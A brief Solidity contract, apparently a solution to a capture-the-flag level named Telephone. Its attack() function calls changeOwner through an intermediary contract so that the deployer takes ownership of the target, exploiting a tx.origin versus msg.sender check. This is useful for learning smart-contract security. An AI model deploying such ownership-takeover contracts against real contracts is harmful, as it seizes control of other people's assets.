// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Telephone.sol';

contract Attacker {

  address public target;
  address public deployer;

  constructor (address _target) public {
    target = _target;
    deployer = msg.sender;
  }

  function attack() public {
    Telephone(target).changeOwner(deployer);
    }
}
